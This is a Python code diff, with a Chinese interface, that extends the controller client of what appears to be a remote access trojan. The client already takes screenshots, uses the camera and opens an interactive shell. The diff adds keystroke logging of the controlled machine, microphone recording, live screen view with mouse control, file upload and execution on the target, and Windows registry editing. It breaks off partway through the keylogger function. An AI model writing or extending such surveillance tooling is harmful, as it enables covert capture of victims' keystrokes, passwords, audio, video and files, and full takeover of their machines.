@@ -32,6 +32,58 @@ class RemoteControlClient:
         self.client_socket = None
         self.is_connected = False
         self.is_authenticated = False
+    
+    def _clear_socket_buffer(self, timeout=0.1):
+        """
+        清理socket接收缓冲区中的残留数据
+        
+        Args:
+            timeout: 超时时间(秒)
+        """
+        original_timeout = self.client_socket.gettimeout()
+        self.client_socket.settimeout(timeout)
+        total_cleared = 0
+        try:
+            while True:
+                leftover = self.client_socket.recv(4096)
+                if not leftover:
+                    break
+                total_cleared += len(leftover)
+        except:
+            pass
+        finally:
+            self.client_socket.settimeout(original_timeout)
+        return total_cleared
+    
+    def clear_buffer_manual(self):
+        """手动清理缓冲区 - 用户可见的菜单选项"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}  🧽 清理缓冲区{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.YELLOW}ℹ️  此功能用于清理视频流残留数据,修复 'UTF-8 解码错误'{Colors.RESET}")
+            print(f"{Colors.YELLOW}ℹ️  如果视频预览/录像启动失败,请使用此功能{Colors.RESET}\n")
+            
+            input(f"{Colors.BOLD}按 Enter 键开始清理...{Colors.RESET}")
+            
+            print(f"\n{Colors.CYAN}正在清理缓冲区...{Colors.RESET}")
+            
+            # 清理缓冲区,使用较长的超时确保清理干净
+            cleared = self._clear_socket_buffer(timeout=1.0)
+            
+            if cleared > 0:
+                print(f"{Colors.GREEN}✓ 成功清理 {cleared} 字节残留数据{Colors.RESET}")
+                print(f"{Colors.GREEN}✓ 缓冲区已清空,现在可以正常使用视频功能{Colors.RESET}")
+            else:
+                print(f"{Colors.GREEN}✓ 缓冲区已干净,没有发现残留数据{Colors.RESET}")
+            
+            print(f"\n{Colors.CYAN}提示: 如果问题仍然存在,请尝试:{Colors.RESET}")
+            print(f"  1. 重新连接客户端和服务端")
+            print(f"  2. 确保所有视频预览窗口已关闭")
+            print(f"  3. 再次运行此清理功能")
+            
+        except Exception as e:
+            print(f"{Colors.RED}✗ 清理失败: {e}{Colors.RESET}")
         
         print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
         print(f"{Colors.CYAN}{Colors.BOLD}{'  远程控制系统 - 客户端 (控制器A)':^60}{Colors.RESET}")
@@ -127,10 +179,14 @@ class RemoteControlClient:
         print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
         print(f"{Colors.BOLD}  1. {Colors.RESET} 📸 远程截屏")
         print(f"{Colors.BOLD}  2. {Colors.RESET} 📷 摄像头功能")
-        print(f"{Colors.BOLD}  3. {Colors.RESET} 📂 文件下载")
-        print(f"{Colors.BOLD}  4. {Colors.RESET} 💻 系统信息")
-        print(f"{Colors.BOLD}  5. {Colors.RESET} 🐚 交互式{SHELL_TYPE} (完整功能)")
-        print(f"{Colors.BOLD}  6. {Colors.RESET} 🚺 断开连接")
+        print(f"{Colors.BOLD}  3. {Colors.RESET} 📂 文件管理")
+        print(f"{Colors.BOLD}  4. {Colors.RESET} 🐚 交互式{SHELL_TYPE} (完整功能)")
+        print(f"{Colors.BOLD}  5. {Colors.RESET} 🔐 注册表管理 (Windows)")
+        print(f"{Colors.BOLD}  6. {Colors.RESET} 🎤 麦克风录音")
+        print(f"{Colors.BOLD}  7. {Colors.RESET} 🖥️ 屏幕实时查看与鼠标控制")
+        print(f"{Colors.BOLD}  8. {Colors.RESET} 🕵️ 键盘监控 (记录按键)")
+        print(f"{Colors.BOLD}  9. {Colors.RESET} 💻 查看系统信息")
+        print(f"{Colors.BOLD} 10. {Colors.RESET} 🚪 断开连接")
         print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
     
     def run(self):
@@ -143,19 +199,27 @@ class RemoteControlClient:
         while self. is_authenticated:
             try:
                 self.show_menu()
-                choice = input(f"\n{Colors.BOLD}请选择操作 (1-6): {Colors.RESET}").strip()
+                choice = input(f"\n{Colors.BOLD}请选择操作 (1-10): {Colors.RESET}").strip()
                 
                 if choice == '1':
                     self.request_screenshot()
                 elif choice == '2':
                     self.camera_menu()
                 elif choice == '3':
-                    self.request_file_download()
+                    self.file_management_menu()
                 elif choice == '4':
-                    self.request_system_info()
-                elif choice == '5':
                     self.enter_shell_mode()
+                elif choice == '5':
+                    self.registry_menu()
                 elif choice == '6':
+                    self.request_mic_record()
+                elif choice == '7':
+                    self.screen_preview()
+                elif choice == '8':
+                    self.keyboard_monitor()
+                elif choice == '9':
+                    self.request_system_info()
+                elif choice == '10':
                     print(f"\n{Colors.YELLOW}正在断开连接...{Colors.RESET}")
                     break
                 else:
@@ -220,6 +284,7 @@ class RemoteControlClient:
         print(f"{Colors.BOLD}  1. {Colors.RESET} 📸 拍照")
         print(f"{Colors.BOLD}  2. {Colors.RESET} 📹 实时视频预览")
         print(f"{Colors.BOLD}  3. {Colors.RESET} 🎥 开始/停止录像")
+        print(f"{Colors.BOLD}  9. {Colors.RESET} 🧽 清理缓冲区 (修复数据错乱)")
         print(f"{Colors.BOLD}  0. {Colors.RESET} ⬅️  返回主菜单")
         print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
     
@@ -228,7 +293,7 @@ class RemoteControlClient:
         while True:
             try:
                 self.show_camera_menu()
-                choice = input(f"\n{Colors.BOLD}请选择功能 (0-3): {Colors.RESET}").strip()
+                choice = input(f"\n{Colors.BOLD}请选择功能 (0-3, 9): {Colors.RESET}").strip()
                 
                 if choice == '1':
                     self.request_camera()
@@ -236,6 +301,8 @@ class RemoteControlClient:
                     self.video_preview()
                 elif choice == '3':
                     self.video_record_menu()
+                elif choice == '9':
+                    self.clear_buffer_manual()
                 elif choice == '0':
                     print(f"{Colors.CYAN}← 返回主菜单{Colors.RESET}")
                     break
@@ -312,14 +379,28 @@ class RemoteControlClient:
                 print(f"{Colors.RED}✗ 参数格式错误{Colors.RESET}")
                 return
             
+            # 清理socket缓冲区中可能残留的数据(防止上次未正常退出的残留)
+            cleared = self._clear_socket_buffer()
+            if cleared > 0:
+                print(f"{Colors.YELLOW}ℹ️  已自动清理 {cleared} 字节残留数据{Colors.RESET}")
+            
             # 发送开始视频流请求
             msg = create_video_start_message(width, height, fps, quality)
             send_message(self.client_socket, msg)
             
             print(f"\n{Colors.CYAN}正在启动视频流...{Colors.RESET}")
+            print(f"{Colors.YELLOW}提示: 摄像头初始化可能需要30秒,请耐心等待{Colors.RESET}")
             
-            # 接收响应
-            response = receive_message(self.client_socket)
+            # 临时延长超时时间,因为摄像头启动可能需要较长时间
+            original_timeout = self.client_socket.gettimeout()
+            self.client_socket.settimeout(VIDEO_START_TIMEOUT)
+            
+            try:
+                # 接收响应
+                response = receive_message(self.client_socket)
+            finally:
+                # 恢复原始超时
+                self.client_socket.settimeout(original_timeout)
             
             if not response or response['type'] != MessageType.VIDEO_START:
                 print(f"{Colors.RED}✗ 启动视频流失败{Colors.RESET}")
@@ -425,17 +506,7 @@ class RemoteControlClient:
                 response = receive_message(self.client_socket)
                 
                 # 清空socket缓冲区中可能残留的视频帧数据
-                self.client_socket.settimeout(0.5)  # 设置500ms超时
-                try:
-                    while True:
-                        # 尝试接收并丢弃残留数据
-                        leftover = self.client_socket.recv(4096)
-                        if not leftover:
-                            break
-                except:
-                    pass  # 超时或没有更多数据,正常
-                finally:
-                    self.client_socket.settimeout(None)  # 恢复阻塞模式
+                self._clear_socket_buffer(timeout=0.5)
                 
                 elapsed = time.time() - start_time
                 actual_fps = frame_count / elapsed if elapsed > 0 else 0
@@ -448,6 +519,119 @@ class RemoteControlClient:
             print(f"{Colors.RED}✗ 视频预览失败: {e}{Colors.RESET}")
             import traceback
             traceback.print_exc()
+
+    def screen_preview(self):
+        """实时屏幕预览并支持鼠标控制"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}  屏幕实时查看与鼠标控制{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+
+            print(f"\n{Colors.YELLOW}屏幕参数 (直接回车使用默认):{Colors.RESET}")
+            fps = input(f"  帧率 [10]: ").strip() or '10'
+            quality = input(f"  JPEG质量 1-100 [70]: ").strip() or '70'
+            try:
+                fps = int(fps)
+                quality = int(quality)
+            except:
+                print(f"{Colors.RED}✗ 参数格式错误, 使用默认值{Colors.RESET}")
+                fps = 10
+                quality = 70
+
+            # 清理缓冲区
+            cleared = self._clear_socket_buffer()
+            if cleared > 0:
+                print(f"{Colors.YELLOW}ℹ️  已自动清理 {cleared} 字节残留数据{Colors.RESET}")
+
+            # 请求服务器开始屏幕流
+            msg = create_screen_start_message(region=None, fps=fps, quality=quality)
+            send_message(self.client_socket, msg)
+
+            # 接收开始响应
+            response = receive_message(self.client_socket)
+            if not response or response['type'] != MessageType.SCREEN_START or not response['data'].get('success'):
+                print(f"{Colors.RED}✗ 启动屏幕查看失败: {response['data'].get('error','未知错误') if response else '无响应'}{Colors.RESET}")
+                return
+
+            print(f"{Colors.GREEN}✓ 屏幕流已启动, 按 'q' 退出预览{Colors.RESET}")
+
+            # 导入opencv
+            try:
+                import cv2
+                import numpy as np
+            except ImportError:
+                print(f"{Colors.RED}✗ 未安装 opencv-python, 无法显示屏幕预览{Colors.RESET}")
+                return
+
+            window_name = 'Remote Screen'
+            cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)
+
+            # 鼠标回调: 发送鼠标事件到服务器
+            def _mouse_cb(event, x, y, flags, param):
+                try:
+                    if event == cv2.EVENT_LBUTTONDOWN:
+                        msg = create_mouse_event_message('click', x=x, y=y, button='left', clicks=1)
+                        send_message(self.client_socket, msg)
+                    elif event == cv2.EVENT_RBUTTONDOWN:
+                        msg = create_mouse_event_message('click', x=x, y=y, button='right', clicks=1)
+                        send_message(self.client_socket, msg)
+                    elif event == cv2.EVENT_MOUSEMOVE and (flags & cv2.EVENT_FLAG_LBUTTON):
+                        # drag with left button pressed
+                        msg = create_mouse_event_message('move', x=x, y=y)
+                        send_message(self.client_socket, msg)
+                except Exception:
+                    pass
+
+            cv2.setMouseCallback(window_name, _mouse_cb)
+
+            frame_count = 0
+            start_time = time.time()
+
+            try:
+                while True:
+                    frame_msg = receive_message(self.client_socket)
+                    if not frame_msg:
+                        time.sleep(0.05)
+                        continue
+
+                    if frame_msg['type'] == MessageType.SCREEN_FRAME:
+                        frame_data = receive_binary_data(self.client_socket)
+                        if not frame_data:
+                            continue
+                        # 显示JPEG数据
+                        nparr = np.frombuffer(frame_data, np.uint8)
+                        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+                        if frame is None:
+                            continue
+                        frame_count += 1
+                        # 显示
+                        cv2.imshow(window_name, frame)
+                        if cv2.waitKey(1) & 0xFF == ord('q'):
+                            break
+                    elif frame_msg['type'] == MessageType.SCREEN_STOP:
+                        break
+                    else:
+                        # 忽略其他消息
+                        continue
+
+            except KeyboardInterrupt:
+                pass
+            finally:
+                try:
+                    msg = create_screen_stop_message()
+                    send_message(self.client_socket, msg)
+                except:
+                    pass
+                cv2.destroyAllWindows()
+                elapsed = time.time() - start_time
+                actual_fps = frame_count / elapsed if elapsed > 0 else 0
+                print(f"\n{Colors.GREEN}✓ 屏幕预览已停止{Colors.RESET}")
+                print(f"  总帧数: {frame_count}")
+                print(f"  总时长: {elapsed:.1f}秒")
+                print(f"  平均FPS: {actual_fps:.1f}")
+
+        except Exception as e:
+            print(f"{Colors.RED}✗ 屏幕预览失败: {e}{Colors.RESET}")
     
     def video_record_menu(self):
         """录像管理菜单"""
@@ -466,12 +650,23 @@ class RemoteControlClient:
                 # 开始录像
                 filename = input(f"{Colors.BOLD}录像文件名 (留空自动生成): {Colors.RESET}").strip() or None
                 
+                # 清理socket缓冲区中可能残留的数据
+                self._clear_socket_buffer()
+                
                 msg = create_record_start_message(filename)
                 send_message(self.client_socket, msg)
                 
                 print(f"{Colors.CYAN}正在开始录像...{Colors.RESET}")
+                print(f"{Colors.YELLOW}提示: 如果视频流未启动,需要初始化摄像头,可能需要30秒{Colors.RESET}")
                 
-                response = receive_message(self.client_socket)
+                # 临时延长超时时间
+                original_timeout = self.client_socket.gettimeout()
+                self.client_socket.settimeout(VIDEO_START_TIMEOUT)
+                
+                try:
+                    response = receive_message(self.client_socket)
+                finally:
+                    self.client_socket.settimeout(original_timeout)
                 
                 if response and response['type'] == MessageType.RECORD_STATUS:
                     if response['data']['success']:
@@ -507,6 +702,41 @@ class RemoteControlClient:
         
         except Exception as e:
             print(f"{Colors.RED}✗ 录像操作失败: {e}{Colors.RESET}")
+    
+    def show_file_management_menu(self):
+        """显示文件管理菜单"""
+        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+        print(f"{Colors.CYAN}{Colors.BOLD}  📂 文件管理{Colors.RESET}")
+        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+        print(f"{Colors.BOLD}  1. {Colors.RESET} 📥 下载文件")
+        print(f"{Colors.BOLD}  2. {Colors.RESET} 📤 上传文件")
+        print(f"{Colors.BOLD}  3. {Colors.RESET} ▶️ 执行文件")
+        print(f"{Colors.BOLD}  0. {Colors.RESET} 🔙 返回主菜单")
+        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+    
+    def file_management_menu(self):
+        """文件管理菜单"""
+        while True:
+            try:
+                self.show_file_management_menu()
+                choice = input(f"\n{Colors.BOLD}请选择操作 (0-3): {Colors.RESET}").strip()
+                
+                if choice == '1':
+                    self.request_file_download()
+                elif choice == '2':
+                    self.request_file_upload()
+                elif choice == '3':
+                    self.request_file_execute()
+                elif choice == '0':
+                    break
+                else:
+                    print(f"{Colors.RED}✗ 无效的选择, 请重新输入{Colors.RESET}")
+            
+            except KeyboardInterrupt:
+                print(f"\n{Colors.YELLOW}操作被用户中断{Colors.RESET}")
+                break
+            except Exception as e:
+                print(f"{Colors.RED}✗ 操作失败: {e}{Colors.RESET}")
     
     def request_file_download(self):
         """请求文件下载"""
@@ -554,8 +784,234 @@ class RemoteControlClient:
                     print(f"{Colors.RED}✗ 文件下载失败: {error}{Colors. RESET}")
         
         except Exception as e:
-            print(f"{Colors.RED}✗ 文件下载请求失败: {e}{Colors. RESET}")
+            print(f"{Colors.RED}✗ 文件下载请求失败: {e}{Colors.RESET}")
     
+    def request_file_upload(self):
+        """请求文件上传"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}  文件上传{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+            
+            # 输入本地文件路径
+            local_filepath = input(f"{Colors.BOLD}请输入本地文件路径: {Colors.RESET}").strip()
+            
+            if not local_filepath:
+                print(f"{Colors.RED}✗ 文件路径不能为空{Colors.RESET}")
+                return
+            
+            # 检查文件是否存在
+            if not os.path.exists(local_filepath):
+                print(f"{Colors.RED}✗ 文件不存在: {local_filepath}{Colors.RESET}")
+                return
+            
+            if not os.path.isfile(local_filepath):
+                print(f"{Colors.RED}✗ 不是一个文件: {local_filepath}{Colors.RESET}")
+                return
+            
+            # 输入远程保存路径
+            remote_filepath = input(f"{Colors.BOLD}请输入远程保存路径 (留空则保存到safe_files/目录): {Colors.RESET}").strip()
+            
+            if not remote_filepath:
+                remote_filepath = os.path.basename(local_filepath)
+            
+            # 读取文件数据
+            file_data = read_file_binary(local_filepath)
+            if file_data is None:
+                print(f"{Colors.RED}✗ 读取本地文件失败{Colors.RESET}")
+                return
+            
+            # 发送文件上传请求
+            filename = os.path.basename(local_filepath)
+            msg = create_file_upload_message(remote_filepath, filename)
+            send_message(self.client_socket, msg)
+            
+            # 发送文件数据
+            print(f"{Colors.CYAN}正在上传文件... ({format_file_size(len(file_data))}){Colors.RESET}")
+            send_binary_data(self.client_socket, file_data)
+            
+            # 接收响应
+            response = receive_message(self.client_socket)
+            
+            if response and response['type'] == MessageType.FILE_UPLOAD_RESPONSE:
+                if response['data']['success']:
+                    print(f"{Colors.GREEN}✓ 文件上传成功!{Colors.RESET}")
+                    print(f"  本地文件: {local_filepath}")
+                    print(f"  远程路径: {response['data']['filepath']}")
+                    print(f"  文件大小: {format_file_size(len(file_data))}")
+                else:
+                    error = response['data'].get('error', '未知错误')
+                    print(f"{Colors.RED}✗ 文件上传失败: {error}{Colors.RESET}")
+        
+        except Exception as e:
+            print(f"{Colors.RED}✗ 文件上传请求失败: {e}{Colors.RESET}")
+    
+    def request_file_execute(self):
+        """请求文件执行"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}  文件执行{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.RED}⚠️  注意: 文件执行限制在safe_files/目录内{Colors.RESET}")
+            
+            filepath = input(f"{Colors.BOLD}请输入要执行的文件路径: {Colors.RESET}").strip()
+            
+            if not filepath:
+                print(f"{Colors.RED}✗ 文件路径不能为空{Colors.RESET}")
+                return
+            
+            # 输入执行参数
+            args = input(f"{Colors.BOLD}请输入执行参数 (可选): {Colors.RESET}").strip()
+            
+            # 发送文件执行请求
+            msg = create_file_execute_message(filepath, args)
+            send_message(self.client_socket, msg)
+            
+            print(f"{Colors.CYAN}正在执行文件...{Colors.RESET}")
+            
+            # 接收响应
+            response = receive_message(self.client_socket)
+            
+            if response and response['type'] == MessageType.FILE_EXECUTE_RESPONSE:
+                if response['data']['success']:
+                    print(f"{Colors.GREEN}✓ 文件执行成功!{Colors.RESET}")
+                    print(f"  文件路径: {filepath}")
+                    print(f"  执行参数: {args if args else '(无)'}")
+                    print(f"  进程ID: {response['data']['pid']}")
+                    
+                    # 显示输出
+                    if 'output' in response['data'] and response['data']['output']:
+                        print(f"\n{Colors.CYAN}输出:{Colors.RESET}")
+                        print(response['data']['output'])
+                else:
+                    error = response['data'].get('error', '未知错误')
+                    print(f"{Colors.RED}✗ 文件执行失败: {error}{Colors.RESET}")
+        
+        except Exception as e:
+            print(f"{Colors.RED}✗ 文件执行请求失败: {e}{Colors.RESET}")
+
+    def show_registry_menu(self):
+        """显示注册表管理菜单 (仅 Windows)"""
+        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+        print(f"{Colors.CYAN}{Colors.BOLD}  🔐 注册表管理 (Windows){Colors.RESET}")
+        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+        print(f"{Colors.BOLD}  1. {Colors.RESET} 🔎 查询注册表值")
+        print(f"{Colors.BOLD}  2. {Colors.RESET} ✏️ 设置注册表值")
+        print(f"{Colors.BOLD}  3. {Colors.RESET} 🗑 删除注册表值/键")
+        print(f"{Colors.BOLD}  0. {Colors.RESET} 🔙 返回主菜单")
+        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+
+    def registry_menu(self):
+        """注册表管理交互菜单"""
+        while True:
+            try:
+                self.show_registry_menu()
+                choice = input(f"\n{Colors.BOLD}请选择操作 (0-3): {Colors.RESET}").strip()
+
+                if choice == '1':
+                    self.request_registry_query()
+                elif choice == '2':
+                    self.request_registry_set()
+                elif choice == '3':
+                    self.request_registry_delete()
+                elif choice == '0':
+                    break
+                else:
+                    print(f"{Colors.RED}✗ 无效的选择, 请重新输入{Colors.RESET}")
+
+            except KeyboardInterrupt:
+                print(f"\n{Colors.YELLOW}操作被用户中断{Colors.RESET}")
+                break
+            except Exception as e:
+                print(f"{Colors.RED}✗ 操作失败: {e}{Colors.RESET}")
+
+    def request_registry_query(self):
+        """请求注册表查询 (hive, key_path, 可选 name)"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}  注册表查询{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+
+            hive = input(f"{Colors.BOLD}请输入注册表根 (HKLM/HKCU): {Colors.RESET}").strip().upper()
+            key_path = input(f"{Colors.BOLD}请输入键路径 (例: SOFTWARE\\MyApp): {Colors.RESET}").strip()
+            name = input(f"{Colors.BOLD}请输入值名称 (留空列出所有值): {Colors.RESET}").strip()
+            if name == '':
+                name = None
+
+            msg = create_registry_query_message(hive, key_path, name)
+            send_message(self.client_socket, msg)
+
+            response = receive_message(self.client_socket)
+            if response and response['type'] == MessageType.REGISTRY_RESPONSE:
+                if response['data']['success']:
+                    values = response['data'].get('values', {})
+
+                    if not values:
+                        print(f"{Colors.YELLOW}未找到任何值或键为空{Colors.RESET}")
+                    else:
+                        print(f"\n{Colors.GREEN}✓ 查询结果:{Colors.RESET}")
+                        for k, v in values.items():
+                            print(f"  {k}: {v}")
+                else:
+                    print(f"{Colors.RED}✗ 查询失败: {response['data'].get('error','未知错误')}{Colors.RESET}")
+
+        except Exception as e:
+            print(f"{Colors.RED}✗ 注册表查询失败: {e}{Colors.RESET}")
+
+    def request_registry_set(self):
+        """请求设置注册表值"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}  注册表设置{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+
+            hive = input(f"{Colors.BOLD}请输入注册表根 (HKLM/HKCU): {Colors.RESET}").strip().upper()
+            key_path = input(f"{Colors.BOLD}请输入键路径 (例: SOFTWARE\\MyApp): {Colors.RESET}").strip()
+            name = input(f"{Colors.BOLD}请输入值名称: {Colors.RESET}").strip()
+            value = input(f"{Colors.BOLD}请输入值 (文本): {Colors.RESET}").strip()
+            vtype = input(f"{Colors.BOLD}值类型 (REG_SZ/REG_DWORD, 默认 REG_SZ): {Colors.RESET}").strip().upper()
+            if not vtype:
+                vtype = 'REG_SZ'
+
+            msg = create_registry_set_message(hive, key_path, name, value, vtype)
+            send_message(self.client_socket, msg)
+
+            response = receive_message(self.client_socket)
+            if response and response['type'] == MessageType.REGISTRY_RESPONSE:
+                if response['data']['success']:
+                    print(f"{Colors.GREEN}✓ 注册表设置成功{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}✗ 设置失败: {response['data'].get('error','未知错误')}{Colors.RESET}")
+
+        except Exception as e:
+            print(f"{Colors.RED}✗ 注册表设置失败: {e}{Colors.RESET}")
+
+    def request_registry_delete(self):
+        """请求删除注册表值或键"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}  注册表删除{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+
+            hive = input(f"{Colors.BOLD}请输入注册表根 (HKLM/HKCU): {Colors.RESET}").strip().upper()
+            key_path = input(f"{Colors.BOLD}请输入键路径 (例: SOFTWARE\\MyApp): {Colors.RESET}").strip()
+            name = input(f"{Colors.BOLD}请输入要删除的值名称 (留空删除整个键): {Colors.RESET}").strip()
+            if name == '':
+                name = None
+
+            msg = create_registry_delete_message(hive, key_path, name)
+            send_message(self.client_socket, msg)
+
+            response = receive_message(self.client_socket)
+            if response and response['type'] == MessageType.REGISTRY_RESPONSE:
+                if response['data']['success']:
+                    print(f"{Colors.GREEN}✓ 删除成功{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}✗ 删除失败: {response['data'].get('error','未知错误')}{Colors.RESET}")
+
+        except Exception as e:
+            print(f"{Colors.RED}✗ 注册表删除失败: {e}{Colors.RESET}")
+
     def enter_shell_mode(self):
         """进入交互式Shell模式"""
         try:
@@ -631,6 +1087,58 @@ class RemoteControlClient:
         
         except Exception as e:
             print(f"{Colors.RED}✗ 进入Shell模式失败: {e}{Colors.RESET}")
+
+    def request_mic_record(self):
+        """请求服务器端麦克风录音并下载WAV文件"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}  麦克风录音 (服务器端){Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+
+            dur = input(f"{Colors.BOLD}请输入录音时长(秒, 默认 5): {Colors.RESET}").strip()
+            if not dur:
+                duration = 5
+            else:
+                try:
+                    duration = int(dur)
+                except:
+                    print(f"{Colors.RED}✗ 无效的时长, 使用默认 5 秒{Colors.RESET}")
+                    duration = 5
+
+            sampler = input(f"{Colors.BOLD}采样率 (默认 44100): {Colors.RESET}").strip()
+            samplerate = int(sampler) if sampler.isdigit() else 44100
+
+            ch = input(f"{Colors.BOLD}通道数 (1=单声道,2=立体, 默认 1): {Colors.RESET}").strip()
+            channels = int(ch) if ch.isdigit() else 1
+
+            # 只请求 WAV 格式以避免依赖外部编码器
+            msg = create_mic_record_message(duration=duration, samplerate=samplerate, channels=channels)
+            send_message(self.client_socket, msg)
+
+            print(f"{Colors.CYAN}正在请求服务器录音...{Colors.RESET}")
+            response = receive_message(self.client_socket)
+
+            if response and response['type'] == MessageType.MIC_RECORD_RESPONSE:
+                if response['data'].get('success'):
+                    # 服务端现在只返回 WAV
+                    filename = response['data'].get('filename', f'mic_{int(time.time())}.wav')
+                    size = response['data'].get('size', 0)
+
+                    print(f"{Colors.CYAN}接收音频数据 ({format_file_size(size)})...{Colors.RESET}")
+                    audio_bytes = receive_binary_data(self.client_socket)
+                    if audio_bytes:
+                        save_path = os.path.join(DOWNLOAD_DIRECTORY, filename)
+                        if write_file_binary(save_path, audio_bytes):
+                            print(f"{Colors.GREEN}✓ 录音保存成功: {save_path}{Colors.RESET}")
+                        else:
+                            print(f"{Colors.RED}✗ 保存文件失败{Colors.RESET}")
+                    else:
+                        print(f"{Colors.RED}✗ 接收音频数据失败{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}✗ 录音失败: {response['data'].get('error','未知错误')}{Colors.RESET}")
+
+        except Exception as e:
+            print(f"{Colors.RED}✗ 请求麦克风录音失败: {e}{Colors.RESET}")
     
     def show_shell_help(self):
         """显示Shell命令帮助"""
@@ -663,6 +1171,15 @@ class RemoteControlClient:
             print("  findstr   - 搜索文本 (正则)")
             print("  tree      - 显示目录树")
             print("  attrib    - 显示/修改文件属性")
+            
+            print(f"\n{Colors.BOLD}进程管理命令:{Colors.RESET}")
+            print("  tasklist  - 显示进程列表")
+            print("  taskkill  - 终止进程")
+            print("    示例: taskkill /PID 1234 /F")
+            print("    示例: taskkill /IM notepad.exe /F")
+            print("  start     - 启动程序")
+            print("  wmic      - 查询进程信息")
+            print("    示例: wmic process list brief")
             
         else:  # LinuxShell
             print(f"\n{Colors.BOLD}基础信息命令:{Colors.RESET}")
@@ -699,6 +1216,21 @@ class RemoteControlClient:
             print(f"\n{Colors.BOLD}文件权限:{Colors.RESET}")
             print("  chmod     - 修改权限")
             print("  chown     - 修改所有者")
+            
+            print(f"\n{Colors.BOLD}进程管理命令:{Colors.RESET}")
+            print("  ps        - 显示进程列表")
+            print("    示例: ps aux")
+            print("    示例: ps -ef | grep python")
+            print("  top       - 实时进程监控")
+            print("  htop      - 增强版进程监控")
+            print("  kill      - 终止进程")
+            print("    示例: kill -9 1234")
+            print("  killall   - 按名称终止进程")
+            print("    示例: killall python")
+            print("  pkill     - 按模式终止进程")
+            print("  pgrep     - 查找进程PID")
+            print("  pidof     - 查找进程PID")
+            print("  pstree    - 显示进程树")
         
         print(f"\n{Colors.YELLOW}命令组合:{Colors.RESET}")
         print("  &&        - 顺序执行 (前一个成功才执行下一个)")
@@ -755,6 +1287,93 @@ class RemoteControlClient:
         
         except Exception as e:
             print(f"{Colors.RED}✗ 系统信息请求失败: {e}{Colors.RESET}")
+
+    def keyboard_monitor(self):
+        """键盘监控功能 - 记录被控端的按键到文件"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}  🕵️ 键盘监控{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.YELLOW}此功能将监控被控端的所有键盘操作{Colors.RESET}")
+            print(f"{Colors.YELLOW}按键记录将保存到本地文件{Colors.RESET}\n")
+            
+            # 生成日志文件名
+            from datetime import datetime
+            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+            log_filename = f"keyboard_log_{timestamp}.txt"
+            log_filepath = os.path.join(DOWNLOAD_DIRECTORY, log_filename)
+            
+            print(f"日志文件: {log_filepath}")
+            print(f"\n{Colors.BOLD}按 Ctrl+C 停止监控{Colors.RESET}\n")
+            
+            # 发送开始监控请求
+            msg = create_keyboard_monitor_start_message()
+            send_message(self.client_socket, msg)
+            
+            print(f"{Colors.GREEN}✓ 键盘监控已启动{Colors.RESET}")
+            print(f"{Colors.CYAN}正在接收按键数据...{Colors.RESET}\n")
+            
+            # 打开日志文件
+            with open(log_filepath, 'w', encoding='utf-8') as log_file:
+                log_file.write(f"=== 键盘监控日志 ===\n")
+                log_file.write(f"开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                log_file.write(f"目标主机: {self.server_ip}\n")
+                log_file.write(f"{'='*50}\n\n")
+                log_file.flush()
+                
+                try:
+                    # 持续接收键盘事件
+                    while True:
+                        # 设置较短的超时以便及时响应 Ctrl+C
+                        self.client_socket.settimeout(0.5)
+                        
+                        try:
+                            response = receive_message(self.client_socket)
+                            
+                            if response and response['type'] == MessageType.KEYBOARD_EVENT:
+                                key = response['data'].get('key', '')
+                                event_type = response['data'].get('event_type', '')
+                                timestamp = response['data'].get('timestamp', '')
+                                
+                                # 只记录按键按下事件
+                                if event_type == 'press':
+                                    # 格式化按键名称
+                                    key_display = key.replace('Key.', '').replace("'", "")
+                                    
+                                    # 写入日志
+                                    log_entry = f"[{timestamp}] {key_display}\n"
+                                    log_file.write(log_entry)
+                                    log_file.flush()
+                                    
+                                    # 在控制台显示
